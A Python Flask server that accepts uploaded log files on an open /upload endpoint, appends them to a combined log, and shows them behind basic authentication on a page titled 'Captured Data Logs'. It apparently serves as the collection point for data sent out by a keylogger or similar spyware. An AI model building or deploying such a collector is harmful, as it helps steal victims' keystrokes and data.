import os, time
from flask import Flask, request, send_file
from flask_httpauth import HTTPBasicAuth
import bcrypt
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)

# Railway-compatible storage setup
if os.environ.get("RAILWAY_ENVIRONMENT"):
    SAVE_DIR = "/data/received_logs"
    os.makedirs(SAVE_DIR, exist_ok=True)
    COMBINED_LOG = os.path.join(SAVE_DIR, "combined.log")
else:
    SAVE_DIR = os.path.expanduser("~/received_logs")
    COMBINED_LOG = os.path.join(SAVE_DIR, "received_combined.log")
    os.makedirs(SAVE_DIR, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files.get('logfile')
    if not f:
        return "No logfile", 400

    data = f.read().decode('utf-8', errors='ignore')
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    
    with open(COMBINED_LOG, "a", encoding="utf-8") as log:
        log.write(f"\n--- Received at {timestamp} ---\n{data}")
    
    print(f"[+] Appended upload ({len(data)} bytes)")
    return "OK", 200

# Authentication
auth = HTTPBasicAuth()

@auth.verify_password
def verify_password(username, password):
    if username == "admin":
        hashed_password = os.getenv("ADMIN_PASSWORD", "").encode()
        if hashed_password:
            try:
                return bcrypt.checkpw(password.encode(), hashed_password)
            except:
                return False
    return False

@app.route('/logs')
@auth.login_required
def view_logs():
    try:
        with open(COMBINED_LOG, 'r', encoding='utf-8') as f:
            log_content = f.read()
        
        # Split into entries
        entries = []
        current_entry = []
        for line in log_content.splitlines():
            if line.startswith('--- Received at '):
                if current_entry:
                    entries.append('\n'.join(current_entry))
                    current_entry = []
            current_entry.append(line)
        if current_entry:
            entries.append('\n'.join(current_entry))
        
        # Build HTML response
        html_response = [
            "<!DOCTYPE html>",
            "<html><head>",
            "<title>Captured Data</title>",
            "<style>",
            "body { font-family: Arial, sans-serif; margin: 20px; }",
            "h1 { color: #333; }",
            ".entry { margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 15px; }",
            ".timestamp { color: #666; font-weight: bold; margin-bottom: 10px; }",
            ".content { background: #f9f9f9; padding: 10px; border-radius: 5px; white-space: pre-wrap; }",
            "</style></head>",
            "<body><h1>Captured Data Logs</h1>"
        ]
        
        for entry in entries:
            if not entry.strip():
                continue
            if '--- Received at ' in entry:
                timestamp, content = entry.split('---\n', 1)
                timestamp = timestamp.replace('--- Received at ', '').strip()
            else:
                timestamp = "Unknown time"
                content = entry
            
            html_response.extend([
                f'<div class="entry">',
                f'<div class="timestamp">Received at {timestamp}</div>',
                f'<div class="content">{content.replace("<", "&lt;").replace(">", "&gt;").replace("\n", "<br>")}</div>',
                '</div>'
            ])
        
        html_response.append("</body></html>")
        
        return '\n'.join(html_response), 200, {'Content-Type': 'text/html; charset=utf-8'}
        
    except FileNotFoundError:
        return "Log file not found", 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("Server starting with configuration:")
    print(f"Log directory: {SAVE_DIR}")
    app.run(host="0.0.0.0", port=port)